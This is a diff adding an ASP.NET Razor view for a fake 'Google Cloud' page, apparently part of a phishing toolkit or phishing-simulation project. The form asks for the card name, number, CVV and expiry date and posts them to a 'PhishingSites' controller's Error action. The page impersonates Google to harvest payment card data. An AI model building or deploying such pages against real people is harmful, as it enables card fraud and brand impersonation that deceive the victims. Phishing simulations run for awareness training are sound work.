@@ -1,0 +1,47 @@
+
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Form</title>
+    <link rel="stylesheet" href="~/css/google.css">
+</head>
+<body>
+ 
+<div class="box">
+    <div class="logo">
+        <img src="~/images/GoogleCloud.png" id="google-img" alt="google"/>
+    </div>
+    <h2>Google Cloud</h2>
+    <p>{EMAİL}</p>
+    @using (Html.BeginForm("Error", "PhishingSites", FormMethod.Post))
+    {
+        <div class="inputBox" style="margin-bottom: 2rem">
+            <input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>Card name</label>
+        </div>
+        <div class="inputBox" style="margin-bottom: 2rem">
+            <input oninput="formatCreditCardNumber()" id="creditCard" type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>Card number</label>
+        </div>
+        <div class="inputBox" style="margin-bottom: 2rem" >
+            <input oninput="CVV()" id="cvv" maxlength="3" type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>CVV</label>
+        </div>
+        <div class="inputBox" style="margin-bottom: 2rem">
+            <input id="expirationDate"  oninput="formatDate()" maxlength="5" type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+            <label>Card expiration date MM/YY</label>
+        </div>
+        <input type="submit" name="sign-in" value="Pay">
+    }
+</div>
+<script src="~/js/card.js"></script>
+     
+</body>
+</html>
